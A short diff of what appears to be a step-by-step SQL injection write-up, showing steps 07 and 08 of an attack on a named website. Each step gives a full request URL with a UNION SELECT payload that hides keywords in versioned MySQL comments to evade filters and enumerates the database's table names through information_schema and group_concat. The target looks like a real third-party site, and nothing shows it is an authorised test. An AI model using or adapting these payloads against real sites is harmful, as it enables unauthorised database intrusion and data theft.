@@ -42,7 +42,6 @@ got the version what is : 5.7.44-48
 #### Step 07 : going for database 
 https://aquacity.com.pk/page.php?id=6%27/*!12345union*/%20/*!00000select*/%201,2,table_name%20/*!12312from*/%20/*!information_schema.tables*/%20--+
 outcome : CHARACTER_SETS
-the outcome is not as expected.
 
 #### Step 08 : using "group_concat"
 https://aquacity.com.pk/page.php?id=6%27/*!12345union*/%20/*!00000select*/%201,2,group_concat(table_name)%20/*!12312from*/%20/*!information_schema.tables*/%20--+
